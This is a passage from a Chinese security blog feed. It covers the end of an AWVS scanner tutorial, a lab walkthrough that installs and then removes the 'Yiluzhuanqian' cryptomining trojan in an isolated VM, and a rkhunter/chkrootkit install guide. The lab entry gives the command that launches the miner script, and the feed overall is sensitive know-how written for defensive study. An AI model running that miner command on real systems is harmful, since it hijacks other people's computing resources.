alt="upload successful"></p><p>可以看到，右边，process=100.0%，看来安全扫描全部进行完毕，而process上面已经说的很清楚了，红色感叹号代表高危漏洞，黄色的感叹号代表中危漏洞，蓝色感叹号代表低危漏洞，绿色感叹号代表信息泄露，其实，我们在做渗透测试的大多数时候，只需要关注高危漏洞就可以了。</p><h3 id="0x07-结果导出"><a href="#0x07-结果导出" class="headerlink" title="0x07 结果导出"></a>0x07 结果导出</h3><p><img src="/images/AWVS APPSCAN/11.png" alt="upload successful"></p><h4 id="主界面——Scanning-Profiles-scripts"><a href="#主界面——Scanning-Profiles-scripts" class="headerlink" title="主界面——Scanning Profiles scripts"></a>主界面——Scanning Profiles scripts</h4><p><img src="/images/AWVS APPSCAN/12.png" alt="upload successful"></p><h4 id="主界面——Scan-Setting"><a href="#主界面——Scan-Setting" class="headerlink" title="主界面——Scan Setting"></a>主界面——Scan Setting</h4><p><img src="/images/AWVS APPSCAN/13.png" alt="upload successful"></p><h4 id="批量扫描"><a href="#批量扫描" class="headerlink" title="批量扫描"></a>批量扫描</h4><p><img src="/images/AWVS APPSCAN/14.png" alt="upload successful"></p><h4 id="Acunetix的计划任务，主要特性如下"><a href="#Acunetix的计划任务，主要特性如下" class="headerlink" title="Acunetix的计划任务，主要特性如下:"></a>Acunetix的计划任务，主要特性如下:</h4><p>（a). 可用于大量扫描，扫描结果保存在“C:\Users\Public\Documents\AcunetixWVS 10\Saves”。 </p><p>（b). 扫描结束，可以使用邮件通知。</p><p>（c). 可设定计划时间，什么时候允许扫描，什么时候不允许扫描</p><h4 id="蜘蛛爬行功能"><a href="#蜘蛛爬行功能" class="headerlink" title="蜘蛛爬行功能"></a>蜘蛛爬行功能</h4><p><img src="/images/AWVS APPSCAN/15.png" alt="upload successful"></p><h4 id="目标探测工具（Target-Finder）"><a href="#目标探测工具（Target-Finder）" class="headerlink" title="目标探测工具（Target Finder）"></a>目标探测工具（Target Finder）</h4><p><img src="/images/AWVS APPSCAN/16.png" alt="upload successful"></p><h4 id="子域名探测工具（Subdomain-Scanner）"><a href="#子域名探测工具（Subdomain-Scanner）" class="headerlink" title="子域名探测工具（Subdomain Scanner）"></a>子域名探测工具（Subdomain Scanner）</h4><p><img src="/images/AWVS APPSCAN/18.png" alt="upload successful"></p><h4 id="SQL盲注测试工具（Blind-SQL-Injection）"><a href="#SQL盲注测试工具（Blind-SQL-Injection）" class="headerlink" title="SQL盲注测试工具（Blind SQL Injection）"></a>SQL盲注测试工具（Blind SQL Injection）</h4><p><img src="/images/AWVS APPSCAN/17.png" alt="upload successful"></p><p><strong>➢AWVS的HTTP嗅探工具（HTTP Sniffer）</strong> </p><p><strong>➢AWVS的HTTP模糊测试工具（HTTP Fuzzer）</strong></p><p><strong>➢AWVS的认证测试工具（Authentication Tester）</strong> </p><p><strong>➢AWVS的WEB WSDL扫描测试工具（Web Services Scanner、 Web Services Editor）</strong></p><h3 id="0x08-参考文献"><a href="#0x08-参考文献" class="headerlink" title="0x08 参考文献"></a>0x08 参考文献</h3><p><a href="https://blog.csdn.net/lynnlinlin/article/details/52947526" target="_blank" rel="noopener">https://blog.csdn.net/lynnlinlin/article/details/52947526</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x01-【前言】&quot;&gt;&lt;a href=&quot;#0x01-【前言】&quot; class=&quot;headerlink&quot; title=&quot;0x01 【前言】&quot;&gt;&lt;/a&gt;0x01 【前言】&lt;/h3&gt;&lt;p&gt;Acuneti Webb Vulnerability Scanner是一款知名的Web网络漏洞扫描工具，它通过网络爬虫测试你的网站安全，检测流行安全漏洞。现已更新到11，下面介绍9版本。&lt;/p&gt;
    
    </summary>
    
      <category term="安全工具" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="AWVS" scheme="http://yoursite.com/tags/AWVS/"/>
    
  </entry>
  
  <entry>
    <title>查杀&quot;一路赚钱木马&quot;</title>
    <link href="http://yoursite.com/2018/08/20/%E6%9F%A5%E6%9D%80%E4%B8%80%E8%B7%AF%E8%B5%9A%E9%92%B1%E6%9C%A8%E9%A9%AC/"/>
    <id>http://yoursite.com/2018/08/20/查杀一路赚钱木马/</id>
    <published>2018-08-20T03:01:22.000Z</published>
    <updated>2018-08-20T03:18:10.241Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-【准备工作】"><a href="#0x01-【准备工作】" class="headerlink" title="0x01 【准备工作】"></a>0x01 【准备工作】</h3><p><strong>虚拟机的网络适配器选择NAT连接，防止感染物理主机</strong>。</p><a id="more"></a><h4 id="植入木马："><a href="#植入木马：" class="headerlink" title="植入木马："></a>植入木马：</h4><p>将mservice.sh的执行文件放在根（/）目录下</p><p>执行脚本开始挣钱：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo bash mservice.sh 55138      //55138为自己的一路挣钱ID号</span><br></pre></td></tr></table></figure></p><h3 id="0x02-【查找木马】"><a href="#0x02-【查找木马】" class="headerlink" title="0x02 【查找木马】"></a>0x02 【查找木马】</h3><h4 id="1-通过查看top-看到CPU占有197-7-（2个CPU）"><a href="#1-通过查看top-看到CPU占有197-7-（2个CPU）" class="headerlink" title="1.通过查看top 看到CPU占有197.7% （2个CPU）"></a>1.通过查看top 看到CPU占有197.7% （2个CPU）</h4><p><img src="/images/木马查杀/1.png" alt="upload successful"></p><h4 id="2-通过lsof-p-51885查看xig的进程目录，和用lsof-i-查看端口开放状态。"><a href="#2-通过lsof-p-51885查看xig的进程目录，和用lsof-i-查看端口开放状态。" class="headerlink" title="2.通过lsof -p 51885查看xig的进程目录，和用lsof -i 查看端口开放状态。"></a>2.通过lsof -p 51885查看xig的进程目录，和用lsof -i 查看端口开放状态。</h4><h4 id="3-通过命令cat-etc-passwd-发现了陌生用户和可疑"><a href="#3-通过命令cat-etc-passwd-发现了陌生用户和可疑" class="headerlink" title="3.通过命令cat /etc/passwd 发现了陌生用户和可疑"></a>3.通过命令cat /etc/passwd 发现了陌生用户和可疑</h4><p><img src="/images/木马查杀/2.png" alt="upload successful"></p><h4 id="4-用iostat命令查看块设备运行状态"><a href="#4-用iostat命令查看块设备运行状态" class="headerlink" title="4.用iostat命令查看块设备运行状态"></a>4.用iostat命令查看块设备运行状态</h4><p><img src="/images/木马查杀/3.png" alt="upload successful"></p><h4 id="5-用netstat-anplt查看端口开放情况，发现了几个可疑的端口和对应的服务。"><a href="#5-用netstat-anplt查看端口开放情况，发现了几个可疑的端口和对应的服务。" class="headerlink" title="5.用netstat -anplt查看端口开放情况，发现了几个可疑的端口和对应的服务。"></a>5.用netstat -anplt查看端口开放情况，发现了几个可疑的端口和对应的服务。</h4><p><img src="/images/木马查杀/4.png" alt="upload successful"></p><h4 id="6-用crontab-l命令查看计划任务，发现了可疑状态。"><a href="#6-用crontab-l命令查看计划任务，发现了可疑状态。" class="headerlink" title="6.用crontab -l命令查看计划任务，发现了可疑状态。"></a>6.用crontab -l命令查看计划任务，发现了可疑状态。</h4><p><img src="/images/木马查杀/5.png" alt="upload successful"></p><h4 id="7-在-opt中目录中新增了如下的可疑文件"><a href="#7-在-opt中目录中新增了如下的可疑文件" class="headerlink" title="7.在/opt中目录中新增了如下的可疑文件"></a>7.在/opt中目录中新增了如下的可疑文件</h4><p><img src="/images/木马查杀/6.png" alt="upload successful"></p><h4 id="8-查看这些文件的内容如下："><a href="#8-查看这些文件的内容如下：" class="headerlink" title="8.查看这些文件的内容如下："></a>8.查看这些文件的内容如下：</h4><p><img src="/images/木马查杀/7.png" alt="upload successful"></p><p><img src="/images/木马查杀/8.png" alt="upload successful"></p><h4 id="9-查看开机启动项systemctl-list-unit-files-grep-enable，发现YiluzhuanqianSer-service服务。"><a href="#9-查看开机启动项systemctl-list-unit-files-grep-enable，发现YiluzhuanqianSer-service服务。" class="headerlink" title="9.查看开机启动项systemctl list-unit-files | grep enable，发现YiluzhuanqianSer.service服务。"></a>9.查看开机启动项systemctl list-unit-files | grep enable，发现YiluzhuanqianSer.service服务。</h4><p><img src="/images/木马查杀/9.png" alt="upload successful"></p><h4 id="10-其他："><a href="#10-其他：" class="headerlink" title="10.其他："></a>10.其他：</h4><p>（1）通过命令find  . -type -f atime -3搜索最近3天内被访问过的所有文件</p><p>（2）history 查看命令历史。less tail -200 .bash_history查看200条各用户命令记录。</p><p>（3）last查看最近登录用户。</p><p>（4）检测alias别名</p><h3 id="0x03-【清除木马】"><a href="#0x03-【清除木马】" class="headerlink" title="0x03 【清除木马】"></a>0x03 【清除木马】</h3><h4 id="1-去除可疑文件的权限"><a href="#1-去除可疑文件的权限" class="headerlink" title="1.去除可疑文件的权限"></a>1.去除可疑文件的权限</h4><p><img src="/images/木马查杀/10.png" alt="upload successful"></p><h4 id="2-删除可以的文件和目录"><a href="#2-删除可以的文件和目录" class="headerlink" title="2.删除可以的文件和目录"></a>2.删除可以的文件和目录</h4><p><img src="/images/木马查杀/11.png" alt="upload successful"></p><h4 id="3-清除计划任务。"><a href="#3-清除计划任务。" class="headerlink" title="3.清除计划任务。"></a>3.清除计划任务。</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crontab -r    //清除计划任务</span><br></pre></td></tr></table></figure><p><img src="/images/木马查杀/12.png" alt="upload successful"></p><h4 id="4-关掉可疑的开机自启服务YiluzhuanqianSer-service"><a href="#4-关掉可疑的开机自启服务YiluzhuanqianSer-service" class="headerlink" title="4.关掉可疑的开机自启服务YiluzhuanqianSer.service"></a>4.关掉可疑的开机自启服务YiluzhuanqianSer.service</h4><p><img src="/images/木马查杀/13.png" alt="upload successful"></p><h4 id="5-查看进程，杀死可疑的服务进程"><a href="#5-查看进程，杀死可疑的服务进程" class="headerlink" title="5.查看进程，杀死可疑的服务进程"></a>5.查看进程，杀死可疑的服务进程</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ps aux</span><br><span class="line"></span><br><span class="line">kill -9 51877</span><br></pre></td></tr></table></figure><p><img src="/images/木马查杀/14.png" alt="upload successful"></p><h4 id="6、reboot-重启"><a href="#6、reboot-重启" class="headerlink" title="6、reboot  重启"></a>6、reboot  重启</h4><h3 id="0x04-【检测已经清除木马】"><a href="#0x04-【检测已经清除木马】" class="headerlink" title="0x04 【检测已经清除木马】"></a>0x04 【检测已经清除木马】</h3><p><strong>CUP运行正常</strong>：</p><p><img src="/images/木马查杀/15.png" alt="upload successful"></p><p><strong>端口开放正常</strong>：</p><p><img src="/images/木马查杀/16.png" alt="upload successful"></p><p><strong>一路赚钱后台212的IP已经离线：</strong><br><img src="/images/木马查杀/17.png" alt="upload successful"></p><h3 id="0x05-【参考文献】"><a href="#0x05-【参考文献】" class="headerlink" title="0x05 【参考文献】"></a>0x05 【参考文献】</h3><p><a href="https://www.jianshu.com/p/26d1567c4d0b" target="_blank" rel="noopener">https://www.jianshu.com/p/26d1567c4d0b</a></p><p><a href="https://wenku.baidu.com/view/d9c72c596c85ec3a86c2c54e.html" target="_blank" rel="noopener">https://wenku.baidu.com/view/d9c72c596c85ec3a86c2c54e.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x01-【准备工作】&quot;&gt;&lt;a href=&quot;#0x01-【准备工作】&quot; class=&quot;headerlink&quot; title=&quot;0x01 【准备工作】&quot;&gt;&lt;/a&gt;0x01 【准备工作】&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;虚拟机的网络适配器选择NAT连接，防止感染物理主机&lt;/strong&gt;。&lt;/p&gt;
    
    </summary>
    
      <category term="木马查杀" scheme="http://yoursite.com/categories/%E6%9C%A8%E9%A9%AC%E6%9F%A5%E6%9D%80/"/>
    
    
      <category term="木马查杀" scheme="http://yoursite.com/tags/%E6%9C%A8%E9%A9%AC%E6%9F%A5%E6%9D%80/"/>
    
  </entry>
  
  <entry>
    <title>编译安装rkhunter &amp;&amp; chkrootkit(后门检测工具)</title>
    <link href="http://yoursite.com/2018/08/20/%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85rkhunter-chkrootkit-%E5%90%8E%E9%97%A8%E6%A3%80%E6%B5%8B%E5%B7%A5%E5%85%B7/"/>
    <id>http://yoursite.com/2018/08/20/编译安装rkhunter-chkrootkit-后门检测工具/</id>
    <published>2018-08-20T02:50:29.000Z</published>
    <updated>2018-08-20T02:59:25.064Z</updated>
    
    <content type="html"><![CDATA[<h3 id="安装包类型："><a href="#安装包类型：" class="headerlink" title="安装包类型："></a>安装包类型：</h3><p><strong>rkhunter-1.4.6.tar.gz<br>chkrootkit.tar.gz</strong></p><a id="more"></a><h3 id="一、rkhunter（后门检测工具）"><a href="#一、rkhunter（后门检测工具）" class="headerlink" title="一、rkhunter（后门检测工具）"></a>一、rkhunter（后门检测工具）</h3><p>rootkit是Linux平台下最常见的一种木马后门工具，它主要通过替换系统文件来达到入侵和和隐蔽的目的，这种木马比普通木马后门更加危险和隐蔽，普通的检测工具和检查手段很难发现这种木马。rootkit攻击能力极强，对系统的危害很大，它通过一套工具来建立后门和隐藏行迹，从而让攻击者保住权限，以使它在任何时候都可以使用root  权限登录到系统。</p><h4 id="1-解压rkhunter安装包"><a href="#1-解压rkhunter安装包" class="headerlink" title="1.解压rkhunter安装包"></a>1.解压rkhunter安装包</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tar -zxf rkhunter-1.4.6.tar.gz </span><br><span class="line">cd rkhunter-1.4.6/</span><br><span class="line">./installer.sh --install</span><br></pre></td></tr></table></figure><p><img src="/images/安全工具/11.png" alt="upload successful"></p><h4 id="2-为基本系统程序建立校对样本，建议系统安装完成后就建立。"><a href="#2-为基本系统程序建立校对样本，建议系统安装完成后就建立。" class="headerlink" title="2.为基本系统程序建立校对样本，建议系统安装完成后就建立。"></a>2.为基本系统程序建立校对样本，建议系统安装完成后就建立。</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rkhunter --propupd</span><br><span class="line">ls /var/lib/rkhunter/db/rkhunter.dat</span><br></pre></td></tr></table></figure><p><img src="/images/安全工具/12.png" alt="upload successful"></p><h4 id="3-运行rkhunter检查系统"><a href="#3-运行rkhunter检查系统" class="headerlink" title="3.运行rkhunter检查系统"></a>3.运行rkhunter检查系统</h4><p> <strong>它主要执行下面一系列的测试</strong>:</p><p>​    1. MD5校验测试, 检测任何文件是否改动.</p><p>​    2. 检测rootkits使用的二进制和系统工具文件.</p><p>​    3. 检测特洛伊木马程序的特征码.</p><p>​    4. 检测大多常用程序的文件异常属性.</p><p>​    5. 执行一些系统相关的测试 - 因为rootkit hunter可支持多个系统平台.</p><p>​    6. 扫描任何混杂模式下的接口和后门程序常用的端口.</p><p>​    7. 检测如/etc/rc.d/目录下的所有配置文件, 日志文件, 任何异常的隐藏文件等等. 例如, 在检测/dev/.udev和/etc/.pwd.lock文件时候, 我的系统被警告.</p><p>​    8. 对一些使用常用端口的应用程序进行版本测试. 如: Apache Web Server, Procmail等.</p><h4 id="4-执行检测命令："><a href="#4-执行检测命令：" class="headerlink" title="4.执行检测命令："></a>4.执行检测命令：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rkhunter --check</span><br></pre></td></tr></table></figure><p><img src="/images/安全工具/13.png" alt="upload successful"></p><h4 id="5-在线升级rkhunter"><a href="#5-在线升级rkhunter" class="headerlink" title="5.在线升级rkhunter"></a>5.在线升级rkhunter</h4><p>rkhunter是通过一个含有rootkit名字的数据库来检测系统的rootkits漏洞, 所以经常更新该数据库非常重要, 你可以通过下面命令来更新该数据库:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rkhunter --update</span><br></pre></td></tr></table></figure></p><h3 id="二、chkrootkit"><a href="#二、chkrootkit" class="headerlink" title="二、chkrootkit"></a>二、chkrootkit</h3><p>chkrootkit 在监测 rootkit 是否被安装的过程中，需要使用到一些操作系统本身的命令。但不排除一种情况，那就是入侵者有针对性的已经将 chkrootkit 使用的系统命令也做修改，使得 chkrootkit 无法监测 rootkit ，从而达到即使系统安装了 chkrootkit 也无法检测出 rootkit 的存在，从而依然对系统有着控制的途径，而达到入侵的目的。那样的话，用 chkrootkit 构建入侵监测系统将失去任何意义。对此，我们在操作系统刚被安装之后，或者说服务器开放之前，让 chkrootkit 就开始工作。而且，在服务器开放之前，备份 chkrootkit 使用的系统命 令，在一些必要的时候（怀疑系统命令已被修改的情况等等），让 chkrootkit 使用初始备份的系统命令进行工作。</p><h4 id="1-解压chkrootkit压缩包"><a href="#1-解压chkrootkit压缩包" class="headerlink" title="1.解压chkrootkit压缩包"></a>1.解压chkrootkit压缩包</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf chkrootkit.tar.gz</span><br></pre></td></tr></table></figure><p><img src="/images/安全工具/14.png" alt="upload successful"></p><h4 id="2-安装chkrootkit"><a href="#2-安装chkrootkit" class="headerlink" title="2.安装chkrootkit"></a>2.安装chkrootkit</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd chkrootkit-0.52/</span><br><span class="line">make sense</span><br></pre></td></tr></table></figure><p><img src="/images/安全工具/15.png" alt="upload successful"></p><h4 id="3-将chkrootkit移到系统启动目录下"><a href="#3-将chkrootkit移到系统启动目录下" class="headerlink" title="3.将chkrootkit移到系统启动目录下"></a>3.将chkrootkit移到系统启动目录下</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mv chkrootkit /usr/sbin/</span><br><span class="line">chkrootkit</span><br><span class="line">chkrootkit | grep INFECTED</span><br></pre></td></tr></table></figure><p><img src="/images/安全工具/16.png" alt="upload successful"></p><p><strong>安装完成</strong>！</p><h3 id="参考文献："><a href="#参考文献：" class="headerlink" title="参考文献："></a>参考文献：</h3><p><a href="https://www.cnblogs.com/cp-miao/p/6141025.html" target="_blank" rel="noopener">https://www.cnblogs.com/cp-miao/p/6141025.html</a></p><p><a href="https://www.osyunwei.com/archives/10099.html" target="_blank" rel="noopener">https://www.osyunwei.com/archives/10099.html</a></p><p><a href="https://www.kafan.cn/edu/5550504.html" target="_blank" rel="noopener">https://www.kafan.cn/edu/5550504.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;安装包类型：&quot;&gt;&lt;a href=&quot;#安装包类型：&quot; class=&quot;headerlink&quot; title=&quot;安装包类型：&quot;&gt;&lt;/a&gt;安装包类型：&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;rkhunter-1.4.6.tar.gz&lt;br&gt;chkrootkit.tar.gz&lt;/strong&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="安全工具" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="木马查杀" scheme="http://yoursite.com/tags/%E6%9C%A8%E9%A9%AC%E6%9F%A5%E6%9D%80/"/>
    
  </entry>
  
</feed>
